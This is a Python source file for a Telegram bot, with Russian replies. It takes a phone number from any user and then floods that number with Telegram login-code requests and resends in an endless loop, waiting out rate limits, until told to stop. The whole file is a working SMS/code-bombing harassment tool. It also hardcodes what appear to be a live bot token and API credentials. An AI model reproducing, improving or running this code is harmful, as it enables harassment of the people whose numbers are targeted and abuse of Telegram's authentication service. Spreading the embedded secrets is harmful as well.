import telebot
import time
import threading
import random
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.tl.functions.auth import ResendCodeRequest

bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")

api_id = 33180472
api_hash = "025b7581493ae0d83c3946f27a149057"

active = {}

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "отправь номер")

@bot.message_handler(commands=['stop'])
def stop(m):
    if m.chat.id in active:
        active[m.chat.id]['stop'] = True
        bot.reply_to(m, "остановлено")
    else:
        bot.reply_to(m, "нет спама")

@bot.message_handler(func=lambda m: True)
def handle(m):
    phone = ''.join(filter(str.isdigit, m.text.strip()))
    if len(phone) < 10:
        bot.reply_to(m, "не номер")
        return
    if m.chat.id in active:
        bot.reply_to(m, "уже спамим")
        return
    bot.reply_to(m, "спамлю кодом")
    def worker(chat_id, phone):
        client = TelegramClient(f"session_{random.randint(1, 999999)}", api_id, api_hash)
        client.connect()
        active[chat_id] = {'stop': False}
        try:
            while not active[chat_id]['stop']:
                try:
                    result = client.send_code_request(phone)
                    if result and hasattr(result, 'phone_code_hash'):
                        try:
                            client(ResendCodeRequest(phone, result.phone_code_hash))
                        except FloodWaitError as e:
                            time.sleep(e.seconds + 1)
                        except Exception:
                            pass
                except FloodWaitError as e:
                    time.sleep(e.seconds + 1)
                except Exception:
                    pass
                time.sleep(random.uniform(1.5, 2.5))
        finally:
            if chat_id in active:
                del active[chat_id]
            client.disconnect()
    threading.Thread(target=worker, args=(m.chat.id, phone), daemon=True).start()

if __name__ == '__main__':
    bot.infinity_polling()
